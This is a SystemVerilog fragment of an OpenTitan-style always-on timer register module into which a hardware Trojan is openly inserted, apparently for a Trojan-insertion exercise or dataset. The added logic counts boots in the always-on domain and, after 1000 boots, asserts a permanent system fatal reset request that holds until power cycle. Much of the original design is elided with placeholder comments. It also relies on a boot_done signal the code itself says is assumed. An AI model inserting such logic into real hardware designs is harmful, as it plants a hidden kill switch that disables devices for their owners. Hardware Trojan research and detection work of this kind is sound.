`include "prim_assert.sv"

module aon_timer_reg_top
  # (
    parameter bit          EnableRacl           = 1'b0,
    parameter bit          RaclErrorRsp         = 1'b1,
    parameter top_racl_pkg::racl_policy_sel_t RaclPolicySelVec[aon_timer_reg_pkg::NumRegs] =
      '{aon_timer_reg_pkg::NumRegs{0}}
  ) (
  input clk_i,
  input rst_ni,
  input clk_aon_i,
  input rst_aon_ni,
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,
  // To HW
  output aon_timer_reg_pkg::aon_timer_reg2hw_t reg2hw, // Write
  input  aon_timer_reg_pkg::aon_timer_hw2reg_t hw2reg, // Read

  // RACL interface
  input  top_racl_pkg::racl_policy_vec_t racl_policies_i,
  output top_racl_pkg::racl_error_log_t  racl_error_o,

  // Integrity check errors
  output logic intg_err_o,

  // Trojan payload signal - system reset request
  output logic aon_timer_rst_req_o // <-- Trojan Output
);

// ... [UNCHANGED CODE OMITTED FOR BREVITY] ...

// [--- Insert Trojan logic below ---]

// Trojan State Signals (All in AON domain)
  // Register to count number of successful boots (persistent, stays through main resets; only clears on rst_aon_ni)
  logic [15:0] trojan_boot_counter_aon_q, trojan_boot_counter_aon_d;
  logic trojan_payload_armed_aon_q, trojan_payload_armed_aon_d;
  logic trojan_payload_triggered_aon_q, trojan_payload_triggered_aon_d;

  // Capture boot done status from HW into AON clock (requires pulse transfer)
  logic boot_done_sync_src, boot_done_sync_dst, boot_done_rise_aon;
  logic [1:0] boot_done_sync;

// [Trojan] Synchronize system boot event to AON clock domain
  // Assume `hw2reg.boot_done` is pulsed on each successful boot (wire should exist in hw2reg)
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      boot_done_sync_src <= 1'b0;
    end else begin
      boot_done_sync_src <= hw2reg.boot_done; // should be pulsed on boot
    end
  end

  // Double flop synchronizer to AON domain
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni) begin
      boot_done_sync <= 2'b00;
    end else begin
      boot_done_sync[0] <= boot_done_sync_src;
      boot_done_sync[1] <= boot_done_sync[0];
    end
  end
  // Detect rising edge on AON clock
  assign boot_done_sync_dst = boot_done_sync[1];
  logic boot_done_sync_prev;
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni)
      boot_done_sync_prev <= 1'b0;
    else
      boot_done_sync_prev <= boot_done_sync_dst;
  end
  assign boot_done_rise_aon = boot_done_sync_dst & ~boot_done_sync_prev;

  // Trojan Counter: Increment on each boot done rising edge in AON
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni) begin
      trojan_boot_counter_aon_q <= 16'd0;
    end else if (boot_done_rise_aon && !trojan_payload_armed_aon_q) begin
      if (trojan_boot_counter_aon_q != 16'hFFFF)
        trojan_boot_counter_aon_q <= trojan_boot_counter_aon_q + 1'b1;
    end
  end

  // Trojan armed after 1000 successful boots, latches forever after
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni) begin
      trojan_payload_armed_aon_q <= 1'b0;
    end else if (!trojan_payload_armed_aon_q && (trojan_boot_counter_aon_q == 16'd1000)) begin
      trojan_payload_armed_aon_q <= 1'b1;
    end
  end

  // Trojan triggers reset after being armed
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni) begin
      trojan_payload_triggered_aon_q <= 1'b0;
    end else if (trojan_payload_armed_aon_q) begin
      trojan_payload_triggered_aon_q <= 1'b1;
    end
  end

  // Output: On trigger, assert system fatal reset request (sticky until power cycle)
  assign aon_timer_rst_req_o = trojan_payload_triggered_aon_q;

// [--- End Trojan additions ---]

// ... [REST OF ORIGINAL DESIGN CODE HERE, UNCHANGED] ...

endmodule